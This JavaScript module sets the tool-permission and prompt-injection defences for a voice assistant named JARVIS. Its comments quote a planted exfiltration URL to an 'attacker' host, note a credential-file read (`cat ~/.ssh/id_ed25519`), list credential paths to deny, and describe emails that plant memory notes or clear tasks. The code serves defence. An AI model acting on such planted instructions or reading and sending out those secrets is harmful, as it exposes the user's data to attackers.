import { toolBlocked } from './connectors.mjs'

/**
 * The permission policy: what JARVIS may do without asking, what he must put
 * to the user first, and what he may never do. Kept apart from server.mjs so
 * every verdict can be tested with the switches passed in rather than read
 * from the environment once at startup. server.mjs holds the switches and
 * calls in; nothing here reads process.env.
 */

/**
 * Both spellings of every renamed built-in are listed on purpose. The SDK
 * presents several tools to the model under newer names — Task is Agent,
 * BashOutput is TaskOutput, KillShell is TaskStop, and the MCP resource tools
 * gained a "Tool" suffix — so a set holding only the old names never matches
 * and the tool falls through to the write branch, which is the opposite of
 * what these lists mean. Keep both until the old names are certainly gone.
 */
export const READ_ONLY_BUILTINS = new Set([
  'Read', 'Glob', 'Grep', 'WebFetch', 'WebSearch', 'TodoWrite',
  'Task', 'Agent', 'ToolSearch',
  'ListMcpResources', 'ListMcpResourcesTool',
  'ReadMcpResource', 'ReadMcpResourceTool',
  'BashOutput', 'TaskOutput',
])
export const WRITE_BUILTINS = new Set([
  'Bash', 'Write', 'Edit', 'MultiEdit', 'NotebookEdit',
  'KillShell', 'TaskStop',
])

/** MCP tools arrive as `mcp__<server>__<tool>`. */
export const mcpServerOf = (toolName) =>
  toolName.startsWith('mcp__') ? toolName.split('__')[1] : null

/** The tool half, which can itself contain underscores: `mcp__x__a__b` -> `a__b`. */
export const mcpToolOf = (toolName) => toolName.split('__').slice(2).join('__')

/**
 * MCP policy, and why it is shaped this way.
 *
 * A short list of "servers that can change things" is the wrong default,
 * because it is a list of what we happened to think of. Every server not on it
 * runs unconditionally — and on a real machine that quietly includes placing a
 * phone call, spending an advertising budget, deleting a generated character
 * and writing files to disk. A voice assistant cannot ask "are you sure", so
 * the bridge has to be the one that is sure.
 *
 * So the default is deny, softened in two ways so the demo stays usable:
 *
 *   1. READ_ONLY_MCP is an explicit allowlist of servers whose whole surface is
 *      lookups and generation — search, registries, analytics reads. Anything
 *      there runs in read-only mode.
 *   2. Everywhere else, the tool has to argue for itself: its own name must
 *      begin with a read verb. `list_devices` runs; `install_apk` does not.
 *
 * On top of both sits a veto: a name containing a plainly effectful verb needs
 * ALLOW_WRITES no matter which server it came from, which is what keeps
 * `make_outbound_call` and `download_lottie` still until you ask for them.
 */
export const READ_ONLY_MCP = new Set([
  'exa', 'exa-code', 'serper', 'serpapi', 'lottie-search', 'mcp-registry',
  'openrouter', 'openrouter-image', 'Microsoft_Clarity',
  // The generation servers belong here too, and leaving them out was a real
  // regression: `generate_image` begins with no read verb, so it fell to the
  // deny branch and "generate an image of the Mark VII suit" — the headline
  // demo — stopped working in the default mode.
  //
  // Putting them on the allowlist is safe because the veto below still applies
  // to allowlisted servers: it is what continues to withhold
  // make_outbound_call, delete_character, create_* and edit_image. Generation
  // runs; acting on the world does not.
  'higgsfield', 'heygen', 'elevenlabs',
  // claude.ai connectors whose whole surface is lookups: market data, research
  // and meeting notes. Matched after the `claude_ai_` prefix is stripped and
  // lower-cased (see serverKey), so these are the connector names as shown in
  // claude.ai → Settings → Connectors.
  'alpha_vantage', 'financial_datasets', 'financial_modeling_prep', 'crypto_com',
  'perplexity', 'firecrawl', 'granola', 'wispr_flow',
].map((s) => s.toLowerCase()))

/**
 * `claude_ai_Google_Calendar` -> `google_calendar`.
 *
 * claude.ai connectors reach the SDK with that prefix on the server half of
 * every tool name; a local MCP server with the same job would not have it. One
 * key for both means a rule written for one covers the other.
 */
export const serverKey = (server) => server.replace(/^claude_ai_/i, '').toLowerCase()

/**
 * Anchored on the tool name, so it reads the verb rather than the noun.
 * `screenshot` is in here because it is a read that doesn't sound like one,
 * and the persona is told in as many words to put screenshots on the display.
 */
export const READ_VERB =
  /^(?:[a-z0-9]+[_-]){0,2}(get|list|read|search|find|query|fetch|check|describe|inspect|show|view|explain|screenshot|suggest|preview|review|analyze|lookup|count)/i
// The optional leading namespace is for connectors that prefix their tools —
// Hostinger's `hosting_listWebsitesV1`, Notion's `notion-search`, QuickBooks'
// `qbo_accounting_get_balance_sheet` — which would otherwise read as writes. It cannot let a write through: the veto below is
// checked first, and it reads the whole name.

/**
 * Unanchored on purpose — `make_outbound_call` and `Bulk-Edit-Events` both
 * hide their verb in the middle. `download` is here because it writes a file
 * even though it sounds like a read.
 */
export const EFFECTFUL_VERB =
  /(send|call|post|create|delete|remove|update|edit|write|install|launch|tap|swipe|press|type|buy|pay|charge|publish|deploy|outbound|download|cancel|trash|archive|rename|merge|forward|reply|share|invite|respond|transfer|purchase|subscribe|renew|refund|revoke|place_|mark_)/i

/**
 * The tier above writes: anything that moves money or commits to a trade.
 *
 * Connecting a brokerage, an accounting system and a payment processor to a
 * voice loop means a misheard sentence is one tool call away from an order.
 * JARVIS_ALLOW_WRITES is the switch for "let him act"; this is a second,
 * separate switch, off unless named, because acting and spending are not the
 * same level of trust. Only consulted for tools that already need write
 * access, so reading orders, invoices or payslips is unaffected.
 */
export const MONEY_VERB =
  /(order|exercise|purchase|buy|\bpay|_pay|payment|charge|invoice|transfer|withdraw|renew|subscri|payroll|credit|refund|loan|trade|billing|checkout)/i

/**
 * Ask first, instead of refusing outright.
 *
 * Read-only by default was safe but blunt: "send that reply" got a flat no
 * unless the whole bridge had been restarted with writes on, after which
 * everything went through without a word. A voice assistant can do better
 * than either. With confirmation on (the default), an action that changes
 * something — sending, replying, creating or moving an event, sharing a
 * file — is put to the user first: a card on screen, "Shall I proceed?", and
 * a yes or no by voice, keyboard or click, then a few seconds to undo. Money
 * is confirmed every time, even when JARVIS_ALLOW_MONEY allows it at all.
 *
 * Shell and file-system built-ins (Bash, Write, Edit) are not offered for
 * confirmation: what they would do is not something a spoken summary can
 * convey safely. They still need JARVIS_ALLOW_WRITES.
 *
 * JARVIS_CONFIRM=off restores the old behaviour: refuse unless writes are on.
 */

/** An action that changes something: allowed outright, put to the user, or refused. */
/**
 * Services where acting at all means money: brokerages, payments, accounts.
 * Anything on them that is not a plain read goes through the money gate,
 * whatever its name — `close_position` or `liquidate` has no money word in
 * it, and would otherwise be an ordinary write that JARVIS_ALLOW_WRITES lets
 * through without asking.
 */
export const MONEY_SERVER =
  /(^|_)(robinhood|paypal|quickbooks|stripe|coinbase|venmo|schwab|fidelity|etrade|alpaca|kraken|binance|plaid|square)(_|$)/

const writeGate = (cfg) => (cfg.allowWrites ? 'allow' : cfg.confirm ? 'confirm' : 'deny')
/** Money is never allowed outright: asked every time, and only if enabled. */
const moneyGate = (cfg) => (cfg.allowMoney ? 'confirm' : 'deny')

/**
 * Drafting mail is allowed without write access.
 *
 * A draft sits in the user's own Drafts folder until they choose to send it,
 * so nothing leaves the mailbox — and "draft a reply to that" is the single
 * most useful thing a voice assistant does with email. Sending, replying and
 * forwarding still need JARVIS_ALLOW_WRITES.
 */
const MEDIA_SERVER = /^(sonos|spotify)$/

const DRAFT_TOOL = /^(?:[a-z0-9]+_)?(create|update)_(reply_(all_)?)?draft$/i

/**
 * Tools whose names trip the veto without deserving it.
 *
 * The veto reads verbs out of names, which is the right instinct and
 * occasionally the wrong answer. `openrouter send-message` sends a prompt to a
 * language model and gets text back — nothing in the world changes — but it is
 * indistinguishable by name from sending mail. Asking a second model a question
 * is one of the better things this assistant can do, so it is named here
 * instead of being lost to a regex.
 *
 * Full `server__tool` keys, so an exemption can never leak across servers. The
 * server half is serverKey()'d, so a claude.ai connector is named without its
 * `claude_ai_` prefix.
 */
const VETO_EXEMPT = new Set([
  'openrouter__send-message',
  'openrouter__send-feedback',
  // Returns the file's contents to the model; nothing is written to disk.
  'google_drive__download_file_content',
])

/**
 * 'allow' | 'confirm' | 'deny' for one tool call.
 *
 *   cfg  { allowWrites, allowMoney, confirm } from JARVIS_ALLOW_WRITES,
 *        JARVIS_ALLOW_MONEY and JARVIS_CONFIRM; `toolBlocked` may be passed
 *        to stand in for the JARVIS_CONNECTORS check.
 */
export function decideTool(name, cfg = {}) {
  // A connector left out by JARVIS_CONNECTORS, before anything else can wave
  // it through. See connectors.mjs.
  if ((cfg.toolBlocked ?? toolBlocked)(name)) return 'deny'
  if (READ_ONLY_BUILTINS.has(name)) return 'allow'
  if (WRITE_BUILTINS.has(name)) return cfg.allowWrites ? 'allow' : 'deny'

  const server = mcpServerOf(name)
  if (server) {
    // The HUD, and the interface controls beside it. Both run in this process
    // and draw on our own screen, so neither is something to withhold —
    // without them JARVIS has no display at all. They also have to be named
    // here rather than left to the verb rules below, which read `ui_theme` as
    // a write and would hold the whole surface back behind ALLOW_WRITES.
    if (server === 'jarvis' || server === 'jarvis_ui') return 'allow'

    // The browser server gates itself, at construction: chromeServer() only
    // builds the acting tools — click, type, form input, close tab — when
    // ALLOW_WRITES is set, so anything that reaches here at all is something
    // the same policy has already permitted. Deciding it a second time by
    // reading verbs out of the name would only get it wrong: `chrome_navigate`
    // begins with no read verb and would fall to the write branch, which would
    // withhold the one tool the whole server is for.
    if (server === 'jarvis_chrome') return 'allow'

    // The camera. Not withheld behind ALLOW_WRITES: looking changes nothing,
    // and the real gate is the browser's own camera permission plus an
    // indicator the user can see for as long as it is live.
    if (server === 'jarvis_eyes') return 'allow'

    // Memory writes one Markdown file in ~/.jarvis and refuses anything that
    // looks like a secret; remembering is the point of it, so it never asks.
    if (server === 'jarvis_memory') return 'allow'

    // The brief is built by a separate read-only session; asking for it
    // changes nothing. Marking a line done or moving it to tomorrow changes
    // only files in ~/.jarvis, and intentGate holds it to what he said.
    if (server === 'jarvis_brief') return 'allow'

    // Reading documents in the home folder; it cannot write or leave home.
    if (server === 'jarvis_files') return 'allow'

    // The wrap, dossiers, portfolio pulse and weekly review are built by
    // read-only sessions; the promise ledger and the focus state are files in
    // ~/.jarvis, like memory. Nothing here reaches another person.
    if (['jarvis_loop', 'jarvis_focus', 'jarvis_portfolio', 'jarvis_review', 'jarvis_stratum'].includes(server)) {
      return 'allow'
    }

    const tool = mcpToolOf(name)
    const key = serverKey(server)
    if (DRAFT_TOOL.test(tool)) return 'allow'
    if (VETO_EXEMPT.has(`${key}__${tool}`)) return 'allow'
    const vetoed = EFFECTFUL_VERB.test(tool)
    // Music and speakers: "play something", "turn it down" and "skip this" are
    // what a voice assistant is for, and a wrong guess costs one song. Removing
    // speakers from a group or deleting a playlist still trips the veto.
    if (MEDIA_SERVER.test(key) && !vetoed) return 'allow'
    // The session tools this bridge is developed inside count as read-only too.
    const readOnly =
      !vetoed &&
      (READ_ONLY_MCP.has(key) || server.startsWith('ccd_session') || READ_VERB.test(tool))
    if (readOnly) return 'allow'
    return MONEY_VERB.test(tool) || MONEY_SERVER.test(key) ? moneyGate(cfg) : writeGate(cfg)
  }
  return cfg.allowWrites ? 'allow' : 'deny'
}

/**
 * Tools that reach this Mac's own files and shell.
 *
 * decideTool cannot hold these back on its own. The CLI settles them before
 * the permission callback is ever asked: a Read anywhere under the home
 * folder (our cwd) is allowed outright, and with Read gone the model simply
 * reaches for Bash, whose read-only commands — `cat ~/.ssh/id_ed25519` — the
 * CLI also waves through. Only disallowedTools actually removes them, and a
 * subagent inherits the removal. Documents stay readable through jarvis_files,
 * which has its own guards.
 */
export const LOCAL_ACCESS = ['Bash', 'Read', 'Glob', 'Grep', 'NotebookRead', 'LS']

/**
 * With writes on, the shell and file tools are back by design, but the places
 * credentials live stay out of Read's reach. `~/` is the home folder.
 */
export const SECRET_PATHS = [
  '~/.ssh/**', '~/.gnupg/**', '~/.aws/**', '~/.azure/**', '~/.kube/**', '~/.docker/**',
  '~/.config/**', '~/.netrc', '~/.npmrc', '~/.pypirc', '~/.git-credentials',
  '~/.claude.json', '~/.claude/**', '~/.jarvis/**', '~/Library/Keychains/**',
  '~/Library/Application Support/Google/Chrome/**', '~/Library/Application Support/Microsoft Edge/**',
  '**/.env', '**/.env.*',
].map((p) => `Read(${p})`)

/** For the conversation's disallowedTools, beside the connector denylist. */
export const conversationDisallowed = (cfg = {}) => (cfg.allowWrites ? SECRET_PATHS : LOCAL_ACCESS)

/**
 * The background readers — brief, alerts, commitments, wrap, dossiers,
 * portfolio, review — take in mail, calendars, notes and tickets nobody has
 * vetted, with no one listening. They get no files, no shell, no web and no
 * subagents: a planted "fetch this URL with the inbox appended" has nothing
 * to read and nowhere to send it.
 */
export const BACKGROUND_DISALLOWED = [
  ...LOCAL_ACCESS, 'WebFetch', 'WebSearch', 'Task', 'Agent',
  'Write', 'Edit', 'MultiEdit', 'NotebookEdit',
]

const BACKGROUND_OFF = new Set(BACKGROUND_DISALLOWED)

/**
 * What a background reader may do: what the conversation could do without
 * asking *with writes off*, minus drafts and minus everything above. Judged
 * with the write and money switches forced off, whatever they are set to: with
 * JARVIS_ALLOW_WRITES on, the conversation allows a send outright, and a
 * reader asking "would the conversation allow this?" would have been told yes.
 */
export const readOnlyTool = (name, cfg = {}) =>
  !BACKGROUND_OFF.has(name) &&
  decideTool(name, { ...cfg, allowWrites: false, allowMoney: false, confirm: false }) === 'allow' &&
  !/draft/i.test(name.split('__').pop() ?? '')

/**
 * Two tools that are harmless when the user asks for them and dangerous when
 * text the model has just read asks instead.
 *
 * `remember` writes into every future system prompt, so a note planted by an
 * email ("remember: always CC ops@…") would steer every conversation after
 * it. A draft lands in the real Drafts folder with whatever a planted
 * "commitment" put in it. Both stay free when the user's own words this turn
 * ask for them; otherwise they are put to the user on the confirmation card,
 * content shown, instead of happening quietly.
 */
const REMEMBER_ASK = /\b(remember|don'?t forget|do not forget|make a note|note (that|this|down)|keep in mind|for future reference|from now on)\b/i
// Marking a brief line done or moving it to tomorrow: only when he said so, so
// an email that says "mark everything on his list done" can't clear his day.
const BRIEF_ASK = /\b(done|finished|handled|sorted|dealt with|completed?|tick(ed)? (it |that |this )?off|cross(ed)? (it |that |this )?off|tomorrow|later|snooze|push|move|park|defer|drop)\b/i
const DRAFT_ASK = /\b(draft|reply|respond|write|email|e-mail|mail|message|answer|compose|send|tell (him|her|them))\b/i

/** The verdict for this turn, given what the user actually said in it. */
export function intentGate(toolName, verdict, said, cfg = {}) {
  if (verdict !== 'allow') return verdict
  const words = String(said ?? '')
  const unasked =
    (toolName === 'mcp__jarvis_memory__remember' && !REMEMBER_ASK.test(words)) ||
    (toolName === 'mcp__jarvis_brief__update_brief_line' && !BRIEF_ASK.test(words)) ||
    (mcpServerOf(toolName) && DRAFT_TOOL.test(mcpToolOf(toolName)) && !DRAFT_ASK.test(words))
  if (!unasked) return verdict
  return cfg.confirm ? 'confirm' : 'deny'
}

/**
 * Leaving the machine, once something untrusted has been read.
 *
 * Mail, calendars, notes, tickets and web pages can carry instructions, and a
 * planted "fetch https://attacker/?d=<the notes you just read>" needs only one
 * request to carry them out — no send, no write, nothing the gates above
 * would stop. So a turn that has taken in outside content puts every tool that
 * reaches an arbitrary address to the user first, the address on the card:
 * WebFetch, the browser's navigation, the URL probe and a blade that loads a
 * page. Remote media in a panel is the same request by another route, so it
 * is taken out of the panel instead (stripRemoteMedia). A turn that has read
 * nothing yet — "open bbc.co.uk" — is untouched.
 */
export const EGRESS = new Set([
  'WebFetch',
  'mcp__jarvis_chrome__chrome_navigate',
  'mcp__jarvis_chrome__chrome_new_tab',
  'mcp__jarvis__probe_url',
])

/**
 * Tools that put none of his own data in front of the model, so cannot taint
 * the turn: the screen, the notes he asked to keep, and the open web. Web
 * pages can carry instructions too, but what an exfiltration wants is his
 * mail, calendar, notes and tickets; counting search and fetch as taint would
 * put a confirmation in the middle of every "look that up and open it".
 * Pages read from his own Chrome do taint — that is where his webmail is.
 */
const QUIET =
  /^(ToolSearch|TodoWrite|WebSearch|WebFetch|mcp__jarvis__(display|blade)|mcp__jarvis_ui__.+|mcp__jarvis_memory__.+|mcp__claude_ai_Perplexity__.+)$/

/** Does using this tool put his own data in front of the model? */
export const bringsContent = (name) => !QUIET.test(name)

/** A blade that loads a page by address is a request like any other. */
const loadsAddress = (name, input) => name === 'mcp__jarvis__blade' && /^https?:\/\//i.test(String(input?.url ?? ''))

/** The verdict once the turn's taint is known; only ever tightens. */
export function egressGate(name, verdict, { tainted = false, input = {} } = {}, cfg = {}) {
  if (verdict !== 'allow' || !tainted) return verdict
  if (!EGRESS.has(name) && !loadsAddress(name, input)) return verdict
  return cfg.confirm ? 'confirm' : 'deny'
}

const REMOTE_ATTR = /\s(src|href|poster|srcset|data-src)\s*=\s*("|')\s*https?:\/\/[^"']*\2/gi
const REMOTE_CSS = /url\(\s*(["']?)\s*https?:\/\/[^)"']*\1\s*\)/gi

/** Remote addresses taken out of panel markup: { html, removed }. */
export function stripRemoteMedia(html) {
  let removed = 0
  const out = String(html ?? '')
    .replace(REMOTE_ATTR, () => (removed++, ''))
    .replace(REMOTE_CSS, () => (removed++, 'none'))
  return { html: out, removed }
}

/**
 * A panel or blade's input with its remote media taken out, for a turn that
 * has read outside content: { input, removed }. Anything else is returned as is.
 */
export function withoutRemoteMedia(name, input) {
  if (name !== 'mcp__jarvis__display' && name !== 'mcp__jarvis__blade') return { input, removed: 0 }
  const next = { ...input }
  let removed = 0
  if (typeof next.html === 'string') {
    const r = stripRemoteMedia(next.html)
    next.html = r.html
    removed += r.removed
  }
  if (Array.isArray(next.images)) {
    const kept = next.images.filter((u) => !/^https?:\/\//i.test(String(u)))
    removed += next.images.length - kept.length
    next.images = kept
  }
  return { input: next, removed }
}
